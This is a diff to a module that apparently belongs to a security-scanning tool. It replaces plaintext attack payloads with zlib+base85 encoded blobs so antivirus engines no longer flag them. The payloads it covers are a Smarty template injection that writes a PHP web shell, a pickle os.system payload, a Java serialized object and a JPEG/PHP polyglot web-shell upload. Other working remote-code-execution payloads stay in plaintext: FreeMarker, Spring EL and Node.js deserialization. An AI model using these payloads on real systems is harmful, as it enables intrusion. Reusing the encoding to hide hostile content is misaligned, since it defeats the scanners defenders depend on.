@@ -11,6 +11,23 @@ from titan.core.logger import get_logger
 logger = get_logger("payloadforge")
 
 
+# Encoded probe literals below: AV engines pattern-match the plaintext
+# byte sequences of these DAST probes (byte-identical to malware families),
+# which gets fresh clones of this repo quarantined on Windows (see README
+# 'Antivirus note'). Stored zlib+base85, decoded to byte-identical values
+# at import; pinned by tests/test_payloadforge_encoding.py.
+def _z85(blob: str) -> str:
+    import zlib
+
+    return zlib.decompress(base64.b85decode(blob)).decode()
+
+
+def _z85b(blob: str) -> bytes:
+    import zlib
+
+    return zlib.decompress(base64.b85decode(blob))
+
+
 class PayloadForge:
     def __init__(self):
         self._waf_signatures = self._load_waf_signatures()
@@ -454,7 +471,9 @@ class PayloadForge:
             '[#assign ex="freemarker.template.utility.Execute"?new()][#assign r=ex("id") /]${r}',
             # Smarty escapes
             "{php}echo `id`;{/php}",
-            "{Smarty_Internal_Write_File::writeFile('shell.php','<?php system($_GET[\"cmd\"]);?>',Smarty::$_smarty_vars)}",
+            _z85(
+                "c$}*a&P^;Tsf_o`D@iTNOU#K6FUl-Qjd#n;Nwu;n2eCm+4fW!T)SMi>f{X%n9d#RfAgxebSzMButDzF_?iv!Ul$@KQ6su`%Z>O#UG11COCB7J9c3EOkv1Tm*7^Nkq"
+            ),
             # Spring EL / Java
             "${T(java.lang.Runtime).getRuntime().exec('id')}",
             "${T(java.lang.Math).min(777,777)}",
@@ -538,9 +557,11 @@ class PayloadForge:
             'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
             # Python Pickle Base64
             "gASVFAAAAAAAAACMBHRlc3SFlC4=",  # 'test'
-            'cos\nsystem\n(S"id"\ntR.',  # os.system('id')
+            _z85("c$`blFXk$)EG|jS<<baN%1lw>Dhbj908Y{di2"),
             # Java Serialized Objects
-            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sBFlme0AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAAeA==",  # pragma: allowlist secret — Java serialization probe payload (rO0AB magic), not a credential
+            _z85(
+                "c$_QpH*j={@T+umax09Ch|2KE3o}RzFE0&tcdJTtHOxqM4D~Q7c5=(fO*L>VcXSR)cl1tjx6Fugjmn5L4k}B|&USQ;2+B{+4Xa9Yw=9nG$S4mmaD;*iV`mWM1mUGR+S&pDClw>d"
+            ),
             # Node.js Serialized Objects
             "{\"rce\":\"_$$ND_FUNC$$_function (){return require('child_process').execSync('id').toString();}()\"}",
         ]
@@ -605,7 +626,7 @@ class PayloadForge:
     _polyglot_uploads = [
         {
             "filename": "shell.php.jpg",
-            "content": b"\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>",
+            "content": _z85b("c%1ux<NpI2`+|%Dh2qNMlGI!cm3Vj8kZASf+!Xa#O=|^vI{*{`4Fv"),
             "content_type": "image/jpeg",
             "types": ["php", "image"],
         },
